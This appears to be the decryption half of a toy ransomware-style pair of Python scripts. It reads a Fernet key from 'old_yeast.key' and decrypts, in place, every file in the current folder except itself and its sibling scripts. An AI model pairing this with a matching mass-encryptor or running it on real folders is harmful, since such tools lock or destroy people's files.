import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "corintios5-7.py" or file == "old_yeast.key" or file == "corintios5-8.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("old_yeast.key", "rb") as dough:
    truth = dough.read()

for file in files:
    with open(file, "rb") as bread:
        contents = bread.read()
    contents_decrypted = Fernet(truth).decrypt(contents)
    with open(file, "wb") as bread:
        bread.write(contents_decrypted)